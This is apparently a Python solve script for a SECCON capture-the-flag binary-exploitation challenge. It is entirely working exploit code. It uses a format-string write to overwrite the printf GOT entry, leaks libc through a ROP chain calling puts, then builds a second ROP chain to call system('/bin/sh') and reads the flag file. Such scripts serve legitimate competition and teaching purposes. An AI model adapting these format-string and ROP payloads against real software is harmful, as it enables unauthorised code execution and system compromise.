from ptrlib import *
import os

HOST = os.getenv("SECCON_HOST", "localhost")
PORT = int(os.getenv("SECCON_PORT", "5000"))

libc = ELF("./libc.so.6")
elf = ELF("./chall")
#sock = Process("../files/chall")

while True:
    sock = Socket(HOST, PORT)

    # Leak libc
    payload  = b""
    payload += f"%{0x6290}c%8$hn".encode()
    payload += b"A" * (0x10 - len(payload))
    payload += p64(elf.got("printf"))[:-2]
    assert is_scanf_safe(payload)
    sock.sendlineafter("asked.\n", payload)
    sock.recvuntil(p64(elf.got("printf"))[:3])

    payload  = b"A"*0x28
    payload += flat([
        next(elf.gadget("pop rdi; ret;")), elf.got("puts"),
        0x401050, # printf@plt
        elf.symbol("main"),
    ], map=p64)
    assert is_scanf_safe(payload)
    sock.sendline(b" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted " + payload + b" warmly.\nX")

    try:
        libc.base = u64(sock.recvuntil("\"What is", lookahead=True, drop=True)) - libc.symbol("puts")
    except ConnectionResetError:
        logger.warning("Bad luck!")
        continue

    # Get the shell
    payload  = b""
    payload += f"%{0x6290}c%8$hn".encode()
    payload += b"A" * (0x10 - len(payload))
    payload += p64(elf.got("printf"))[:-2]
    sock.sendlineafter("asked.\n", payload)
    assert is_scanf_safe(payload)
    sock.recvuntil(p64(elf.got("printf"))[:3])

    payload  = b"A"*0x28
    payload += flat([
        next(elf.gadget("ret;")),
        next(elf.gadget("pop rdi; ret;")), next(libc.find("/bin/sh")),
        libc.symbol("system")
    ], map=p64)
    assert is_scanf_safe(payload)
    sock.sendline(b" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted " + payload + b" warmly.\nX")

    sock.sendline("cat /flag*")
    while True:
        l = sock.recvline(timeout=3)
        if b"SECCON" in l:
            print(l)
            break

    sock.close()
    break
